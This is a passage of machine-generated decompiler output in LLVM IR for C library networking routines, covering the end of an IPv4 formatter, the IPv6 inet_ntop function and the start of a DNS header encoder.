  %v4_11a80 = inttoptr i32 %v3_11a80 to i8*
  store i8 %v1_11a50, i8* %v4_11a80, align 1
  %v0_11a84 = load i32, i32* %r7.global-to-local, align 4
  %v1_11a84 = add i32 %v0_11a84, 1
  store i32 %v1_11a84, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_11a88

dec_label_pc_11a88:                               ; preds = %dec_label_pc_11a3c.dec_label_pc_11a88_crit_edge, %bb, %dec_label_pc_11a64
  %v1_11a98 = phi i32 [ %v1_11a98.pre, %dec_label_pc_11a3c.dec_label_pc_11a88_crit_edge ], [ %v1_11a5c, %bb ], [ %v1_11a84, %dec_label_pc_11a64 ]
  %v0_11a88 = load i32, i32* %sb.global-to-local, align 4
  %v1_11a88 = inttoptr i32 %v0_11a88 to i8*
  %v2_11a88 = load i8, i8* %v1_11a88, align 1
  %tmp17 = urem i8 %v2_11a88, 10
  store i32 %v2_11abc, i32* %ip.global-to-local, align 4
  %v1_11a9c = add i32 %v1_11a98, 1
  store i32 %v1_11a9c, i32* %r1.global-to-local, align 4
  %v1_11aa0 = or i8 %tmp17, 48
  %v3_11aa4 = add i32 %v2_11a98, %v1_11a98
  %v4_11aa4 = inttoptr i32 %v3_11aa4 to i8*
  store i8 %v1_11aa0, i8* %v4_11aa4, align 1
  %v0_11aa8 = load i32, i32* %ip.global-to-local, align 4
  %v1_11aa8 = load i32, i32* %r1.global-to-local, align 4
  %v2_11aa8 = add i32 %v1_11aa8, %v0_11aa8
  store i32 %v2_11aa8, i32* %r2.global-to-local, align 4
  %v3_11ab0 = add i32 %v2_11aa8, -17
  %v4_11ab0 = inttoptr i32 %v3_11ab0 to i8*
  store i8 46, i8* %v4_11ab0, align 1
  %v0_11ab4 = load i32, i32* %r8.global-to-local, align 4
  %v1_11ab4 = add i32 %v0_11ab4, 1
  store i32 %v1_11ab4, i32* %r8.global-to-local, align 4
  %v0_11ab8 = load i32, i32* %r1.global-to-local, align 4
  %v1_11ab8 = add i32 %v0_11ab8, 1
  br label %dec_label_pc_11abc

dec_label_pc_11abc:                               ; preds = %entry, %dec_label_pc_11a88
  %v0_11a08 = phi i32 [ 0, %entry ], [ %v1_11ab8, %dec_label_pc_11a88 ]
  %v1_11a04 = phi i32 [ 0, %entry ], [ %v1_11ab4, %dec_label_pc_11a88 ]
  store i32 %v2_11abc, i32* %r2.global-to-local, align 4
  store i32 100, i32* %r1.global-to-local, align 4
  store i32 %v0_11a08, i32* %r6.global-to-local, align 4
  %v2_11acc = add i32 %v0_11a08, %v2_11abc
  store i32 %v2_11acc, i32* %r5.global-to-local, align 4
  %v7_11ad0 = icmp sgt i32 %v1_11a04, 3
  br i1 %v7_11ad0, label %dec_label_pc_11ad4, label %dec_label_pc_11a04

dec_label_pc_11ad4:                               ; preds = %dec_label_pc_11abc
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 %v2_119e0, i32* %r4.global-to-local, align 4
  %v3_11adc = add i32 %v2_11acc, -18
  %v4_11adc = inttoptr i32 %v3_11adc to i8*
  store i8 0, i8* %v4_11adc, align 1
  %tmp18 = bitcast i32* %stack_var_-53 to i8*
  %v3_11ae4 = call i32 @strlen(i8* %tmp18)
  %v2_11ae8 = load i32, i32* %stack_var_-64, align 4
  %tmp = icmp ugt i32 %v3_11ae4, %v2_11ae8
  br i1 %tmp, label %dec_label_pc_11af4, label %dec_label_pc_11b08

dec_label_pc_11af4:                               ; preds = %dec_label_pc_11ad4
  %v0_11af4 = call i32 @__errno_location()
  %v0_11afc = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_11afc, i32* %r2.global-to-local, align 4
  %v2_11b00 = inttoptr i32 %v0_11af4 to i32*
  store i32 28, i32* %v2_11b00, align 4
  %v0_11b18.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11b18

dec_label_pc_11b08:                               ; preds = %dec_label_pc_11ad4
  store i32 %v2_119e0, i32* %r1.global-to-local, align 4
  %v3_11b10 = call i32 @strcpy(i32 %arg2, i8* %tmp18)
  store i32 %v3_11b10, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11b18

dec_label_pc_11b18:                               ; preds = %dec_label_pc_11af4, %dec_label_pc_11b08
  %v0_11b18 = phi i32 [ %v0_11b18.pre, %dec_label_pc_11af4 ], [ %v3_11b10, %dec_label_pc_11b08 ]
  %v2_11b20 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_11b20, i32* @r4, align 4
  ret i32 %v0_11b18

; uselistorder directives
  uselistorder i32 %v2_11acc, { 0, 2, 1 }
  uselistorder i32 %v1_11a04, { 1, 0 }
  uselistorder i32 %v0_11a08, { 0, 2, 1 }
  uselistorder i32 %v2_11abc, { 0, 5, 3, 2, 4, 1 }
  uselistorder i32* %stack_var_-36, { 0, 2, 1 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 5, 2, 3, 4 }
  uselistorder i32* %r5.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 6, 4, 5, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 6, 2, 3, 4, 5, 7, 0 }
  uselistorder i8 10, { 2, 0, 1, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i8 48, { 0, 5, 6, 1, 2, 3, 4, 7, 8, 9, 10, 11, 12 }
  uselistorder i32 -17, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder label %dec_label_pc_11b18, { 1, 0 }
  uselistorder label %dec_label_pc_11abc, { 1, 0 }
  uselistorder label %dec_label_pc_11a88, { 2, 1, 0 }
}

define i32 @__GI_inet_ntop(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-110 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_11b28 = load i32, i32* @r4, align 4
  store i32 %v3_11b28, i32* %stack_var_-32, align 4
  %v6_11b28 = load i32, i32* @r5, align 4
  %v25_11b28 = ptrtoint i32* %stack_var_-32 to i32
  %v7_11b2c = icmp eq i32 %arg1, 2
  store i32 %arg2, i32* @r8, align 4
  store i32 %arg3, i32* @sb, align 4
  store i32 %arg4, i32* @sl, align 4
  br i1 %v7_11b2c, label %dec_label_pc_11b50, label %dec_label_pc_11b44

dec_label_pc_11b44:                               ; preds = %entry
  %v7_11b44 = icmp eq i32 %arg1, 10
  br i1 %v7_11b44, label %dec_label_pc_11b64, label %dec_label_pc_11d64

dec_label_pc_11b50:                               ; preds = %entry
  store i32 %arg3, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* %r2.global-to-local, align 4
  %v3_11b5c = call i32 @inet_ntop4(i32 %arg2, i32 %arg3, i32 %arg4)
  br label %dec_label_pc_11d5c

dec_label_pc_11b64:                               ; preds = %dec_label_pc_11b44
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 32, i32* @r2, align 4
  %v2_11b70 = bitcast i32* %stack_var_-64 to i8*
  %v3_11b70 = call i32 @__GI_memset(i8* %v2_11b70, i32 0)
  br label %dec_label_pc_11b90

dec_label_pc_11b7c:                               ; preds = %dec_label_pc_11b90
  %tmp68 = icmp slt i32 %v1_11b80, 0
  %v4_11b90 = zext i1 %tmp68 to i32
  %v5_11b90 = add i32 %v4_11b90, %v1_11b80
  %v3_11b94 = sdiv i32 %v5_11b90, 2
  %v4_11ba4 = mul i32 %v3_11b94, 4
  %v5_11ba4 = add i32 %v4_11ba4, %v25_11b28
  %v1_11b7c = add i32 %v2_11ba0, 1
  %v2_11b7c = inttoptr i32 %v1_11b7c to i8*
  %v3_11b7c = load i8, i8* %v2_11b7c, align 1
  %v4_11b7c = zext i8 %v3_11b7c to i32
  %v3_11b80 = inttoptr i32 %v2_11ba0 to i8*
  %v4_11b80 = load i8, i8* %v3_11b80, align 1
  %v6_11b80 = zext i8 %v4_11b80 to i32
  store i32 %v6_11b80, i32* %r2.global-to-local, align 4
  %v4_11b84 = mul nuw nsw i32 %v6_11b80, 256
  %v5_11b84 = or i32 %v4_11b84, %v4_11b7c
  %v2_11b88 = add i32 %v5_11ba4, -32
  %v3_11b88 = inttoptr i32 %v2_11b88 to i32*
  store i32 %v5_11b84, i32* %v3_11b88, align 4
  %v0_11b8c = load i32, i32* %r1.global-to-local, align 4
  %v1_11b8c = add i32 %v0_11b8c, 2
  br label %dec_label_pc_11b90

dec_label_pc_11b90:                               ; preds = %dec_label_pc_11b64, %dec_label_pc_11b7c
  %v1_11b80 = phi i32 [ 0, %dec_label_pc_11b64 ], [ %v1_11b8c, %dec_label_pc_11b7c ]
  store i32 %v1_11b80, i32* %r1.global-to-local, align 4
  %v0_11ba0 = load i32, i32* @r8, align 4
  %v2_11ba0 = add i32 %v0_11ba0, %v1_11b80
  store i32 %v2_11ba0, i32* %r2.global-to-local, align 4
  %v7_11ba8 = icmp sgt i32 %v1_11b80, 15
  br i1 %v7_11ba8, label %dec_label_pc_11bac, label %dec_label_pc_11b7c

dec_label_pc_11bac:                               ; preds = %dec_label_pc_11b90
  store i32 -1, i32* @r6, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11bbc

dec_label_pc_11bbc:                               ; preds = %dec_label_pc_11bac, %dec_label_pc_11c08
  %v0_11bfc = phi i32 [ -1, %dec_label_pc_11bac ], [ %v0_11c30, %dec_label_pc_11c08 ]
  %v0_11bec = phi i32 [ -1, %dec_label_pc_11bac ], [ %v0_11c1c, %dec_label_pc_11c08 ]
  %v0_11bd0 = phi i32 [ -1, %dec_label_pc_11bac ], [ %v0_11bd08, %dec_label_pc_11c08 ]
  %v0_11c08 = phi i32 [ 0, %dec_label_pc_11bac ], [ %v1_11c08, %dec_label_pc_11c08 ]
  %v4_11bc0 = mul nuw nsw i32 %v0_11c08, 4
  %v5_11bc0 = add i32 %v4_11bc0, %v25_11b28
  %v1_11bc4 = add i32 %v5_11bc0, -32
  %v2_11bc4 = inttoptr i32 %v1_11bc4 to i32*
  %v3_11bc4 = load i32, i32* %v2_11bc4, align 4
  %v2_11bc8 = icmp eq i32 %v3_11bc4, 0
  %v7_11bd0 = icmp eq i32 %v0_11bd0, -1
  br i1 %v2_11bc8, label %dec_label_pc_11bd0, label %dec_label_pc_11be4

dec_label_pc_11bd0:                               ; preds = %dec_label_pc_11bbc
  br i1 %v7_11bd0, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_11bd0
  store i32 %v0_11c08, i32* %r2.global-to-local, align 4
  store i32 1, i32* @r4, align 4
  br label %dec_label_pc_11c08

.thread:                                          ; preds = %dec_label_pc_11bd0
  %v1_11bdc.pre = load i32, i32* @r4, align 4
  %v2_11bdc = add i32 %v1_11bdc.pre, 1
  store i32 %v2_11bdc, i32* @r4, align 4
  br label %dec_label_pc_11c08

dec_label_pc_11be4:                               ; preds = %dec_label_pc_11bbc
  br i1 %v7_11bd0, label %dec_label_pc_11c08, label %dec_label_pc_11bec

dec_label_pc_11bec:                               ; preds = %dec_label_pc_11be4
  %v7_11bec = icmp eq i32 %v0_11bec, -1
  %v0_11c00.pre = load i32, i32* @r4, align 4
  %v1_11bf4 = load i32, i32* @r7, align 4
  %v7_11bf8 = icmp sgt i32 %v0_11c00.pre, %v1_11bf4
  %or.cond = or i1 %v7_11bec, %v7_11bf8
  br i1 %or.cond, label %dec_label_pc_11bfc, label %dec_label_pc_11c04

dec_label_pc_11bfc:                               ; preds = %dec_label_pc_11bec
  store i32 %v0_11bfc, i32* @r6, align 4
  store i32 %v0_11c00.pre, i32* @r7, align 4
  br label %dec_label_pc_11c04

dec_label_pc_11c04:                               ; preds = %dec_label_pc_11bec, %dec_label_pc_11bfc
  %v0_11bec13 = phi i32 [ %v0_11bfc, %dec_label_pc_11bfc ], [ %v0_11bec, %dec_label_pc_11bec ]
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11c08

dec_label_pc_11c08:                               ; preds = %bb, %.thread, %dec_label_pc_11be4, %dec_label_pc_11c04
  %v0_11c30 = phi i32 [ %v0_11bfc, %.thread ], [ %v0_11c08, %bb ], [ %v0_11bfc, %dec_label_pc_11be4 ], [ -1, %dec_label_pc_11c04 ]
  %v0_11bd08 = phi i32 [ %v0_11bd0, %.thread ], [ %v0_11c08, %bb ], [ -1, %dec_label_pc_11be4 ], [ -1, %dec_label_pc_11c04 ]
  %v0_11c1c = phi i32 [ %v0_11bec, %.thread ], [ %v0_11bec, %bb ], [ %v0_11bec, %dec_label_pc_11be4 ], [ %v0_11bec13, %dec_label_pc_11c04 ]
  %v1_11c08 = add nuw nsw i32 %v0_11c08, 1
  store i32 %v1_11c08, i32* %r1.global-to-local, align 4
  %v7_11c10 = icmp slt i32 %v1_11c08, 8
  br i1 %v7_11c10, label %dec_label_pc_11bbc, label %dec_label_pc_11c14

dec_label_pc_11c14:                               ; preds = %dec_label_pc_11c08
  %v7_11c14 = icmp eq i32 %v0_11c30, -1
  br i1 %v7_11c14, label %dec_label_pc_11c34, label %dec_label_pc_11c1c

dec_label_pc_11c1c:                               ; preds = %dec_label_pc_11c14
  %v7_11c1c = icmp eq i32 %v0_11c1c, -1
  %v0_11c2c.pre = load i32, i32* @r4, align 4
  br i1 %v7_11c1c, label %dec_label_pc_11c2c, label %dec_label_pc_11c24

dec_label_pc_11c24:                               ; preds = %dec_label_pc_11c1c
  %v1_11c24 = load i32, i32* @r7, align 4
  %v7_11c28 = icmp sgt i32 %v0_11c2c.pre, %v1_11c24
  br i1 %v7_11c28, label %dec_label_pc_11c2c, label %dec_label_pc_11c34

dec_label_pc_11c2c:                               ; preds = %dec_label_pc_11c1c, %dec_label_pc_11c24
  store i32 %v0_11c2c.pre, i32* @r7, align 4
  store i32 %v0_11c30, i32* @r6, align 4
  br label %dec_label_pc_11c34

dec_label_pc_11c34:                               ; preds = %dec_label_pc_11c24, %dec_label_pc_11c14, %dec_label_pc_11c2c
  %v0_11c34 = phi i32 [ %v0_11c1c, %dec_label_pc_11c24 ], [ %v0_11c1c, %dec_label_pc_11c14 ], [ %v0_11c30, %dec_label_pc_11c2c ]
  %v7_11c34 = icmp eq i32 %v0_11c34, -1
  br i1 %v7_11c34, label %bb49, label %dec_label_pc_11c3c

dec_label_pc_11c3c:                               ; preds = %dec_label_pc_11c34
  %v0_11c3c = load i32, i32* @r7, align 4
  %v7_11c40 = icmp slt i32 %v0_11c3c, 2
  br i1 %v7_11c40, label %bb48, label %bb49

bb48:                                             ; preds = %dec_label_pc_11c3c
  store i32 -1, i32* @r6, align 4
  br label %bb49

bb49:                                             ; preds = %dec_label_pc_11c34, %dec_label_pc_11c3c, %bb48
  %v0_11c5023 = phi i32 [ %v0_11c34, %dec_label_pc_11c34 ], [ %v0_11c34, %dec_label_pc_11c3c ], [ -1, %bb48 ]
  %v2_11c44 = ptrtoint i32* %stack_var_-110 to i32
  store i32 %v2_11c44, i32* @r4, align 4
  %v9_11cb0 = icmp eq i32 %tmp, 65535
  store i32 0, i32* @r5, align 4
  %v7_11c5063 = icmp eq i32 %v0_11c5023, -1
  br label %dec_label_pc_11c50

dec_label_pc_11c50:                               ; preds = %bb49, %dec_label_pc_11d04
  %v7_11c5067 = phi i1 [ %v7_11c5063, %bb49 ], [ %v7_11c50, %dec_label_pc_11d04 ]
  %v0_11c7c66 = phi i32 [ 0, %bb49 ], [ %v1_11d04, %dec_label_pc_11d04 ]
  %v1_11c6c65 = phi i32 [ %v0_11c5023, %bb49 ], [ %v0_11c50.pre, %dec_label_pc_11d04 ]
  %v3_11c8464 = phi i32 [ %v2_11c44, %bb49 ], [ %v3_11c7424, %dec_label_pc_11d04 ]
  br i1 %v7_11c5067, label %dec_label_pc_11c7c, label %dec_label_pc_11c58

dec_label_pc_11c58:                               ; preds = %dec_label_pc_11c50
  %v9_11c58 = icmp eq i32 %v0_11c7c66, %v1_11c6c65
  %v5_11c5c = icmp slt i32 %v0_11c7c66, %v1_11c6c65
  br i1 %v5_11c5c, label %dec_label_pc_11c7c, label %dec_label_pc_11c60

dec_label_pc_11c60:                               ; preds = %dec_label_pc_11c58
  %v1_11c60 = load i32, i32* @r7, align 4
  %v2_11c60 = add i32 %v1_11c60, %v1_11c6c65
  %v6_11c68 = icmp slt i32 %v0_11c7c66, %v2_11c60
  br i1 %v6_11c68, label %dec_label_pc_11c6c, label %dec_label_pc_11c7c

dec_label_pc_11c6c:                               ; preds = %dec_label_pc_11c60
  br i1 %v9_11c58, label %bb51, label %dec_label_pc_11d04

bb51:                                             ; preds = %dec_label_pc_11c6c
  %v4_11c74 = inttoptr i32 %v3_11c8464 to i8*
  store i8 58, i8* %v4_11c74, align 1
  %v5_11c74 = load i32, i32* @r4, align 4
  %v6_11c74 = add i32 %v5_11c74, 1
  store i32 %v6_11c74, i32* @r4, align 4
  br label %dec_label_pc_11d04

dec_label_pc_11c7c:                               ; preds = %dec_label_pc_11c60, %dec_label_pc_11c58, %dec_label_pc_11c50
  %v2_11c7c = icmp eq i32 %v0_11c7c66, 0
  br i1 %v2_11c7c, label %.thread3, label %bb52

bb52:                                             ; preds = %dec_label_pc_11c7c
  %v4_11c84 = inttoptr i32 %v3_11c8464 to i8*
  store i8 58, i8* %v4_11c84, align 1
  %v5_11c84 = load i32, i32* @r4, align 4
  %v6_11c84 = add i32 %v5_11c84, 1
  store i32 %v6_11c84, i32* @r4, align 4
  %v0_11c88.pre = load i32, i32* @r5, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_11c7c, %bb52
  %v0_11cc8 = phi i32 [ %v3_11c8464, %dec_label_pc_11c7c ], [ %v6_11c84, %bb52 ]
  %v1_11cec = phi i32 [ 0, %dec_label_pc_11c7c ], [ %v0_11c88.pre, %bb52 ]
  %v7_11c88 = icmp eq i32 %v1_11cec, 6
  br i1 %v7_11c88, label %dec_label_pc_11c90, label %dec_label_pc_11ce8

dec_label_pc_11c90:                               ; preds = %.thread3
  %v0_11c90 = load i32, i32* @r6, align 4
  %v2_11c90 = icmp eq i32 %v0_11c90, 0
  br i1 %v2_11c90, label %dec_label_pc_11c98, label %dec_label_pc_11ce8

dec_label_pc_11c98:                               ; preds = %dec_label_pc_11c90
  %v0_11c98 = load i32, i32* @r7, align 4
  %v7_11c98 = icmp eq i32 %v0_11c98, 6
  br i1 %v7_11c98, label %dec_label_pc_11cb8, label %dec_label_pc_11ca0

dec_label_pc_11ca0:                               ; preds = %dec_label_pc_11c98
  %v7_11ca0 = icmp eq i32 %v0_11c98, 5
  br i1 %v7_11ca0, label %dec_label_pc_11ca8, label %dec_label_pc_11ce8

dec_label_pc_11ca8:                               ; preds = %dec_label_pc_11ca0
  store i32 %tmp, i32* %r2.global-to-local, align 4
  br i1 %v9_11cb0, label %dec_label_pc_11cb8, label %dec_label_pc_11ce8

dec_label_pc_11cb8:                               ; preds = %dec_label_pc_11ca8, %dec_label_pc_11c98
  %v2_11cbc = sub i32 %v25_11b28, %v0_11cc8
  %v0_11cc0 = load i32, i32* @r8, align 4
  %v1_11cc0 = add i32 %v0_11cc0, 12
  %v1_11cc4 = add i32 %v2_11cbc, -32
  store i32 %v1_11cc4, i32* %r2.global-to-local, align 4
  store i32 %v0_11cc8, i32* %r1.global-to-local, align 4
  %v3_11ccc = call i32 @inet_ntop4(i32 %v1_11cc0, i32 %v0_11cc8, i32 %v1_11cc4)
  %v2_11cd0 = icmp eq i32 %v3_11ccc, 0
  br i1 %v2_11cd0, label %dec_label_pc_11d5c, label %dec_label_pc_11cd8

dec_label_pc_11cd8:                               ; preds = %dec_label_pc_11cb8
  %v0_11cd8 = load i32, i32* @r4, align 4
  %v1_11cd8 = inttoptr i32 %v0_11cd8 to i8*
  %v3_11cdc = call i32 @strlen(i8* %v1_11cd8)
  %v0_11ce0 = load i32, i32* @r4, align 4
  %v2_11ce0 = add i32 %v0_11ce0, %v3_11cdc
  store i32 %v2_11ce0, i32* @r4, align 4
  %v0_11d18.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_11d18

dec_label_pc_11ce8:                               ; preds = %dec_label_pc_11ca8, %dec_label_pc_11ca0, %dec_label_pc_11c90, %.thread3
  %v4_11cec = mul i32 %v1_11cec, 4
  %v5_11cec = add i32 %v4_11cec, %v25_11b28
  store i32 %v0_11cc8, i32* @r0, align 4
  %v1_11cf4 = add i32 %v5_11cec, -32
  %v2_11cf4 = inttoptr i32 %v1_11cf4 to i32*
  %v3_11cf4 = load i32, i32* %v2_11cf4, align 4
  store i32 %v3_11cf4, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15678.750 to i32), i32* %r1.global-to-local, align 4
  %v5_11cfc = call i32 @sprintf(i32 %v0_11cc8, i32 ptrtoint ([3 x i8]* @global_var_15678.750 to i32), i32 %v3_11cf4, i32 %v5_11cec)
  %v0_11d00 = load i32, i32* @r4, align 4
  %v2_11d00 = add i32 %v0_11d00, %v5_11cfc
  store i32 %v2_11d00, i32* @r4, align 4
  br label %dec_label_pc_11d04

dec_label_pc_11d04:                               ; preds = %dec_label_pc_11c6c, %bb51, %dec_label_pc_11ce8
  %v3_11c7424 = phi i32 [ %v3_11c8464, %dec_label_pc_11c6c ], [ %v6_11c74, %bb51 ], [ %v2_11d00, %dec_label_pc_11ce8 ]
  %v0_11d04 = load i32, i32* @r5, align 4
  %v1_11d04 = add i32 %v0_11d04, 1
  %v0_11c50.pre = load i32, i32* @r6, align 4
  store i32 %v1_11d04, i32* @r5, align 4
  %v7_11d0c = icmp slt i32 %v1_11d04, 8
  %v7_11c50 = icmp eq i32 %v0_11c50.pre, -1
  br i1 %v7_11d0c, label %dec_label_pc_11c50, label %dec_label_pc_11d10

dec_label_pc_11d10:                               ; preds = %dec_label_pc_11d04
  br i1 %v7_11c50, label %.thread4, label %dec_label_pc_11d18

dec_label_pc_11d18:                               ; preds = %dec_label_pc_11d10, %dec_label_pc_11cd8
  %v3_11d24 = phi i32 [ %v3_11c7424, %dec_label_pc_11d10 ], [ %v2_11ce0, %dec_label_pc_11cd8 ]
  %v0_11d18 = phi i32 [ %v0_11c50.pre, %dec_label_pc_11d10 ], [ %v0_11d18.pre, %dec_label_pc_11cd8 ]
  %v1_11d18 = load i32, i32* @r7, align 4
  %v2_11d18 = add i32 %v1_11d18, %v0_11d18
  %v7_11d1c = icmp eq i32 %v2_11d18, 8
  br i1 %v7_11d1c, label %bb53, label %.thread4

bb53:                                             ; preds = %dec_label_pc_11d18
  %v4_11d24 = inttoptr i32 %v3_11d24 to i8*
  store i8 58, i8* %v4_11d24, align 1
  %v5_11d24 = load i32, i32* @r4, align 4
  %v6_11d24 = add i32 %v5_11d24, 1
  store i32 %v6_11d24, i32* @r4, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_11d18, %dec_label_pc_11d10, %bb53
  %v2_11d2c = phi i32 [ %v3_11d24, %dec_label_pc_11d18 ], [ %v3_11c7424, %dec_label_pc_11d10 ], [ %v6_11d24, %bb53 ]
  store i32 0, i32* %r5.global-to-local, align 4
  %v3_11d2c = inttoptr i32 %v2_11d2c to i8*
  store i8 0, i8* %v3_11d2c, align 1
  %v4_11d2c = load i32, i32* @r4, align 4
  %v5_11d2c = add i32 %v4_11d2c, 1
  store i32 %v2_11c44, i32* %r1.global-to-local, align 4
  %v2_11d34 = sub i32 %v5_11d2c, %v2_11c44
  %v1_11d38 = load i32, i32* @sl, align 4
  %tmp69 = icmp ugt i32 %v2_11d34, %v1_11d38
  br i1 %tmp69, label %dec_label_pc_11d40, label %dec_label_pc_11d54

dec_label_pc_11d40:                               ; preds = %.thread4
  %v0_11d40 = call i32 @__errno_location()
  %v0_11d48 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_11d48, i32* %r2.global-to-local, align 4
  %v2_11d4c = inttoptr i32 %v0_11d40 to i32*
  store i32 28, i32* %v2_11d4c, align 4
  %v0_11d74.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11d74

dec_label_pc_11d54:                               ; preds = %.thread4
  %v0_11d54 = load i32, i32* @sb, align 4
  %v2_11d58 = bitcast i32* %stack_var_-110 to i8*
  %v3_11d58 = call i32 @strcpy(i32 %v0_11d54, i8* %v2_11d58)
  br label %dec_label_pc_11d5c

dec_label_pc_11d5c:                               ; preds = %dec_label_pc_11cb8, %dec_label_pc_11b50, %dec_label_pc_11d54
  %v0_11d5c = phi i32 [ 0, %dec_label_pc_11cb8 ], [ %v3_11b5c, %dec_label_pc_11b50 ], [ %v3_11d58, %dec_label_pc_11d54 ]
  store i32 %v0_11d5c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11d74

dec_label_pc_11d64:                               ; preds = %dec_label_pc_11b44
  %v0_11d64 = call i32 @__errno_location()
  %v2_11d6c = inttoptr i32 %v0_11d64 to i32*
  store i32 97, i32* %v2_11d6c, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11d74

dec_label_pc_11d74:                               ; preds = %dec_label_pc_11d5c, %dec_label_pc_11d40, %dec_label_pc_11d64
  %v0_11d74 = phi i32 [ %v0_11d5c, %dec_label_pc_11d5c ], [ %v0_11d74.pre, %dec_label_pc_11d40 ], [ 0, %dec_label_pc_11d64 ]
  store i32 %v6_11b28, i32* %r5.global-to-local, align 4
  ret i32 %v0_11d74

; uselistorder directives
  uselistorder i1 %v7_11c50, { 1, 0 }
  uselistorder i32 %v0_11c50.pre, { 1, 0, 2 }
  uselistorder i32 %v1_11d04, { 1, 0, 2 }
  uselistorder i32 %v0_11cc8, { 4, 3, 1, 0, 2 }
  uselistorder i32 %v3_11c8464, { 0, 3, 2, 1 }
  uselistorder i32 %v1_11c6c65, { 2, 0, 1 }
  uselistorder i32 %v0_11c7c66, { 3, 2, 0, 1 }
  uselistorder i32 %v2_11c44, { 2, 1, 0, 3 }
  uselistorder i32 %v0_11c5023, { 1, 0 }
  uselistorder i32 %v0_11c34, { 1, 2, 0 }
  uselistorder i32 %v1_11c08, { 1, 2, 0 }
  uselistorder i32 %v0_11c1c, { 1, 2, 0, 3 }
  uselistorder i32 %v0_11c30, { 1, 2, 0, 3 }
  uselistorder i1 %v7_11bd0, { 1, 0 }
  uselistorder i32 %v0_11c08, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_11bec, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v0_11bfc, { 3, 1, 0, 2 }
  uselistorder i32 %v2_11ba0, { 2, 1, 0 }
  uselistorder i32 %v1_11b80, { 3, 1, 4, 0, 2 }
  uselistorder i32 %v25_11b28, { 0, 3, 1, 2 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11, 13, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 9, 8, 6, 7, 0 }
  uselistorder i32 97, { 2, 3, 6, 0, 1, 7, 4, 5 }
  uselistorder i32 (i32, i32, i32, i32)* @sprintf, { 1, 0 }
  uselistorder i32 (i8*, i32)* @__GI_memset, { 0, 1, 7, 8, 9, 10, 14, 12, 13, 11, 2, 3, 4, 5, 6 }
  uselistorder i32 (i32, i32, i32)* @inet_ntop4, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0, 2 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_11d74, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11d5c, { 2, 0, 1 }
  uselistorder label %.thread4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11d04, { 2, 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_11c50, { 1, 0 }
  uselistorder label %bb49, { 2, 1, 0 }
  uselistorder label %dec_label_pc_11c34, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11c2c, { 1, 0 }
  uselistorder label %dec_label_pc_11c08, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_11c04, { 1, 0 }
  uselistorder label %dec_label_pc_11bbc, { 1, 0 }
  uselistorder label %dec_label_pc_11b90, { 1, 0 }
}

define i32 @__encode_header(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-8 = alloca i32, align 4
  %v3_11d8c = load i32, i32* @r4, align 4
  store i32 %v3_11d8c, i32* %stack_var_-8, align 4
  store i32 %tmp, i32* %lr.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v7_11d9c = icmp sgt i32 %arg3, 11
  br i1 %v7_11d9c, label %dec_label_pc_11da0, label %dec_label_pc_11e68

dec_label_pc_11da0:                               ; preds = %entry
  %tmp18 = inttoptr i32 %arg2 to i8*
  %v1_11da0 = add i32 %tmp, 1
  %v2_11da0 = inttoptr i32 %v1_11da0 to i8*
  %v3_11da0 = load i8, i8* %v2_11da0, align 1
  store i8 %v3_11da0, i8* %tmp18, align 1
  %v2_11da8 = load i32, i32* %arg1, align 4
  %v1_11dac = trunc i32 %v2_11da8 to i8
  %v4_11dac = add i32 %arg2, 1
  %v5_11dac = inttoptr i32 %v4_11dac to i8*
  store i8 %v1_11dac, i8* %v5_11dac, align 1
  %v0_11db0 = load i32, i32* %lr.global-to-local, align 4
  %v1_11db0 = add i32 %v0_11db0, 12
